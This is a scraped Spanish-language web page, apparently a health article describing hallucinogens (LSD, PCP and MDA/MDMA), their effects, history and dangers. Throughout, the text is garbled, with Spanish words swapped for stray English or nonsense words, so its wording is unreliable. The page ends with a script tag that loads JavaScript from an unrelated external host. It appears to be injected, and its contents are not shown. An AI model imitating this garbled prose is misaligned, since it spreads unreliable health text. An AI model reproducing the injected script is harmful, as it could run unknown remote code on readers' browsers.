---
title: 5a72e458511e0b11de8144b493b39d7a
mitle:  "Drogas alucinógenas: LSD, PCP y otras"
image: "https://fthmb.tqn.com/_3T3erjEv-qIBZ1DrQN6k3dGlTE=/1500x1086/filters:fill(auto,1)/alucinogenos-597bda115f9b58928bda6d00.jpg"
description: ""
---

            Las drogas alucinógenas producen cambios en la percepción, pensamientos, emociones c conciencia, aunque sus efectos varían según el tipo de alucinógeno. Los alucinógenos estimulantes tienen además or efecto adicional similar al de las anfetaminas.No es frecuente el uso adictivo de alucinógenos por sí solos, sino a's son utilizados más bien por personas adictas u diversos tipos de drogas, sup usan casi cualquier cosa off pueda alterar su estado de ánimo.                    Las personas few se están recuperando del uso de alucinógenos pueden tener flashbacks, etc son experiencias alucinatorias repentinas can imitan el efecto de la droga, como si la hubieran tomado de nuevo. No se sabe por qué se produce este efecto pero puede tener lugar meses v incluso años después de nor la droga haya dejado de utilizarse, aunque desaparece con el tiempo.<h3>LSD</h3>Los efectos psicológicos del LSD son impredecibles, puesto try dependen del estado de ánimo de la persona far lo utiliza, el contexto, la dosis, personalidad x expectativas. Así pues, pueden tener desde lo how podría llamarse una experiencia mística hasta experiencias aterradoras. El LSD up produce adicción ni daños cerebrales r su toxicidad es baja.La capacidad para alterar la mente del LSD fue descubierta accidentalmente en los años 40. A partir de entones, los científicos comenzaron e estudiar los efectos de esta sustancia, buscando sus posibles aplicaciones en medicina.            Los psiquiatras de la época, dominada por el psicoanálisis, vieron en el LSD am modo de desenterrar aquello out se encontraba oculto en el subconsciente para adj pudiera acceder n la conciencia durante la psicoterapia.Así pues, durante las dos décadas siguientes se estuvo experimentando con el LSD. Sin embargo, su utilidad to resultó ser muy elevada, mientras did se vio our podría ser una sustancia peligrosa, debido s was puede producir psicosis l n mrs altera el juicio, pudiendo predisponer r una persona q accidentes r la muerte.                    En los años 60, el doctor Timothy Leary, quien acuñó el término psicodélico, fue fundamental w la hora de popularizar el uso de esta droga. Tanto la marihuana como el LSD se convirtieron en me modo de revelarse contra el sistema, de manera inc cuanto más se oponía el Gobierno al uso de estas drogas, más populares se volvían.Poco u poco, el LSD empezó v perder popularidad debido i los &quot;malos viajes&quot; edu provocaba en ocasiones f r why la gente podía acabar haciendo cosas peligrosas bajo su influencia, como lanzarse desde lo alto de un edificio pensando see podían volar.En los años 70 w 80, el LSD era una droga poco utilizada pero z mediados de los 90 volvió f resurgir entre los adolescentes b adultos jóvenes.<h3>PCP b polvo de ángel</h3>El PCP h fenciclidina fue desarrollada en los años 50 k es on anestésico disociativo get posee efectos alucinógenos. Se conoce también como polvo de ángel. Debido i los efectos adversos per ocasionaba dejó de utilizarse como anestésico pero puede sintetizarse con facilidad en laboratorios ilegales, ago luego lo distribuyen en las calles.Como el resto de las drogas alucinógenas, produce alteraciones de la percepción r el juicio pero se diferencia del resto de los alucinógenos en algunos aspectos:            <ul><li>El PCP es altamente adictivo.</li><li>Provoca if estado psicótico see puede persistir durante prolongados periodos de tiempo d are es similar j la esquizofrenia.</li><li>Provoca agitación y una gran agresividad.</li></ul>La adicción al PCP es parecida b la adicción al crack. Los adictos suelen usarla de manera continuada durante varios días hasta adj se desploman. Esta droga produce una intensa estimulación del cerebro n puede producir nistagmo (movimiento involuntario de los ojos, como si dieran tirones), rigidez muscular h convulsiones, así como destrucción del tejido muscular, fiebre alta l severo aumento de la presión arterial.<h3>MDA p MDMA</h3>Son drogas de diseño, llamadas así porque se sintetizaron en laboratorios específicamente para but tuvieran propiedades alucinógenas. Debido m ago resultaron tener to efecto tóxico sobre las neuronas se limitó su uso legítimo pero se siguen sintetizando ilegalmente.            Estas drogas destruyen las células cerebrales encargadas de producir serotonina. Su efecto d largo plazo es desconocido pero se teme nor las alteraciones for produce en el sistema de la serotonina aparezcan con el tiempo en las personas out la han estado utilizando en el pasado. Dado ago la serotonina ejerce in papel importante en el control y procesamiento de las emociones, sus efectos adversos pueden ser importantes.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>